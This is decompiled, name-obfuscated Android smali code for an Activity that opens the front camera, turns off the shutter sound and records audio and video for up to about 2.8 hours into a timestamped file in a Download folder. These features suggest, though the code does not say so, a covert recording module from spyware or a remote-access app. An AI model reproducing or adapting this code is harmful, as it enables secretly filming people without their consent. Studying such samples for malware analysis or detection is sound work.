.class public Li/a/a/q;
.super Landroid/app/Activity;
.source "sourcefile"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# instance fields
.field public e:Landroid/media/MediaRecorder;

.field public f:Landroid/view/SurfaceHolder;

.field public g:Z

.field public h:Ljava/lang/String;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SimpleDateFormat"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>()V
    .locals 3

    .line 25
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 28
    const/4 v0, 0x0

    iput-object v0, p0, Li/a/a/q;->f:Landroid/view/SurfaceHolder;

    .line 29
    nop

    .line 30
    const/4 v0, 0x0

    iput-boolean v0, p0, Li/a/a/q;->g:Z

    .line 31
    nop

    .line 32
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v2, "yyyy_MM_dd_HH_mm"

    invoke-direct {v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    .line 33
    invoke-virtual {v1, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ".mp4"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Li/a/a/q;->h:Ljava/lang/String;

    .line 32
    return-void
.end method


# virtual methods
.method public final a()V
    .locals 12
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 60
    const-string v0, "1"

    .line 61
    .local v0, "cameraNumber":Ljava/lang/String;
    const-string v1, "10000000"

    .line 62
    .local v1, "time":Ljava/lang/String;
    const-string v2, "1"

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    invoke-static {v3}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v3

    .line 64
    .local v3, "camera":Landroid/hardware/Camera;
    const/4 v4, 0x0

    .line 65
    .local v4, "cameraCount":I
    new-instance v5, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v5}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 67
    .local v5, "cameraInfo":Landroid/hardware/Camera$CameraInfo;
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v4

    .line 68
    const/4 v6, 0x0

    .local v6, "camIdx":I
    :goto_0
    const/4 v7, 0x1

    if-ge v6, v4, :cond_2

    .line 69
    invoke-static {v6, v5}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 70
    iget v8, v5, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-nez v8, :cond_0

    const-string v8, "0"

    invoke-virtual {v0, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_0

    .line 72
    :try_start_0
    invoke-static {v6}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v8
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    move-object v3, v8

    .line 75
    goto :goto_1

    .line 74
    :catch_0
    move-exception v8

    .line 77
    :cond_0
    :goto_1
    iget v8, v5, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-ne v8, v7, :cond_1

    invoke-virtual {v0, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 80
    :try_start_1
    invoke-static {v6}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v7
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_1

    move-object v3, v7

    .line 83
    goto :goto_2

    .line 82
    :catch_1
    move-exception v7

    .line 68
    :cond_1
    :goto_2
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    .line 87
    .end local v6    # "camIdx":I
    :cond_2
    const/4 v2, 0x0

    .line 88
    .local v2, "cpHigh":Landroid/media/CamcorderProfile;
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6

    if-nez v6, :cond_3

    .line 90
    invoke-static {v7}, Landroid/media/CamcorderProfile;->get(I)Landroid/media/CamcorderProfile;

    move-result-object v2

    .line 92
    :cond_3
    invoke-virtual {v3}, Landroid/hardware/Camera;->unlock()V

    .line 93
    const/4 v6, 0x0

    invoke-virtual {v3, v6}, Landroid/hardware/Camera;->enableShutterSound(Z)Z

    .line 94
    iget-object v8, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    const/16 v9, 0x10e

    invoke-virtual {v8, v9}, Landroid/media/MediaRecorder;->setOrientationHint(I)V

    .line 96
    iget-object v8, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-virtual {v8, v3}, Landroid/media/MediaRecorder;->setCamera(Landroid/hardware/Camera;)V

    .line 97
    iget-object v8, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-virtual {v8, v6}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 98
    iget-object v8, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-virtual {v8, v6}, Landroid/media/MediaRecorder;->setVideoSource(I)V

    .line 100
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    if-nez v8, :cond_4

    .line 102
    iget-object v8, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-virtual {v8, v2}, Landroid/media/MediaRecorder;->setProfile(Landroid/media/CamcorderProfile;)V

    .line 105
    :cond_4
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    if-ne v8, v7, :cond_5

    .line 107
    iget-object v7, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-static {v6}, Landroid/media/CamcorderProfile;->get(I)Landroid/media/CamcorderProfile;

    move-result-object v6

    invoke-virtual {v7, v6}, Landroid/media/MediaRecorder;->setProfile(Landroid/media/CamcorderProfile;)V

    .line 108
    iget-object v6, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    const/4 v7, 0x7

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setVideoFrameRate(I)V

    .line 110
    :cond_5
    new-instance v6, Lg/k/a/a;

    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-direct {v6, v7}, Lg/k/a/a;-><init>(Landroid/content/Context;)V

    .line 112
    .local v6, "storage":Lg/k/a/a;
    invoke-virtual {v6}, Lg/k/a/a;->b()Ljava/lang/String;

    move-result-object v7

    .line 113
    .local v7, "path":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v9, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "Download/"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 114
    .local v8, "newDir":Ljava/lang/String;
    invoke-virtual {v6, v8}, Lg/k/a/a;->a(Ljava/lang/String;)Z

    .line 115
    const-string v9, "efef"

    invoke-static {v9, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 116
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, p0, Li/a/a/q;->h:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 117
    iget-object v9, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v11, p0, Li/a/a/q;->h:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 118
    iget-object v9, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v10

    invoke-virtual {v9, v10}, Landroid/media/MediaRecorder;->setMaxDuration(I)V

    .line 119
    iget-object v9, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    const-wide/32 v10, 0x5f5e100

    invoke-virtual {v9, v10, v11}, Landroid/media/MediaRecorder;->setMaxFileSize(J)V

    .line 120
    return-void
.end method

.method public final b()V
    .locals 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 123
    iget-object v0, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    iget-object v1, p0, Li/a/a/q;->f:Landroid/view/SurfaceHolder;

    invoke-interface {v1}, Landroid/view/SurfaceHolder;->getSurface()Landroid/view/Surface;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setPreviewDisplay(Landroid/view/Surface;)V

    .line 125
    :try_start_0
    iget-object v0, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    .line 126
    iget-object v0, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    .line 131
    goto :goto_0

    .line 128
    :catch_0
    move-exception v0

    .line 129
    .local v0, "e":Ljava/lang/IllegalStateException;
    invoke-virtual {v0}, Ljava/lang/IllegalStateException;->printStackTrace()V

    .line 130
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    .line 132
    .end local v0    # "e":Ljava/lang/IllegalStateException;
    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 37
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 38
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Landroid/app/Activity;->requestWindowFeature(I)Z

    .line 39
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x20

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setFlags(II)V

    .line 41
    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    iput-object v0, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    .line 43
    :try_start_0
    invoke-virtual {p0}, Li/a/a/q;->a()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 46
    goto :goto_0

    .line 44
    :catch_0
    move-exception v0

    .line 45
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 47
    .end local v0    # "e":Ljava/io/IOException;
    :goto_0
    const v0, 0x7f0b0076

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    .line 48
    const v0, 0x7f080196

    invoke-virtual {p0, v0}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/view/SurfaceView;

    .line 49
    .local v0, "cameraView":Landroid/view/SurfaceView;
    invoke-virtual {v0}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    iput-object v1, p0, Li/a/a/q;->f:Landroid/view/SurfaceHolder;

    .line 50
    invoke-interface {v1, p0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 51
    iget-object v1, p0, Li/a/a/q;->f:Landroid/view/SurfaceHolder;

    const/4 v2, 0x3

    invoke-interface {v1, v2}, Landroid/view/SurfaceHolder;->setType(I)V

    .line 53
    return-void
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0
    .param p1, "surfaceHolder"    # Landroid/view/SurfaceHolder;
    .param p2, "i"    # I
    .param p3, "i1"    # I
    .param p4, "i2"    # I

    .line 146
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 1
    .param p1, "surfaceHolder"    # Landroid/view/SurfaceHolder;

    .line 137
    :try_start_0
    invoke-virtual {p0}, Li/a/a/q;->b()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 140
    goto :goto_0

    .line 138
    :catch_0
    move-exception v0

    .line 139
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 141
    .end local v0    # "e":Ljava/io/IOException;
    :goto_0
    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 1
    .param p1, "surfaceHolder"    # Landroid/view/SurfaceHolder;

    .line 150
    iget-boolean v0, p0, Li/a/a/q;->g:Z

    if-eqz v0, :cond_0

    .line 151
    iget-object v0, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    .line 152
    const/4 v0, 0x0

    iput-boolean v0, p0, Li/a/a/q;->g:Z

    .line 154
    :cond_0
    iget-object v0, p0, Li/a/a/q;->e:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 155
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    .line 156
    return-void
.end method
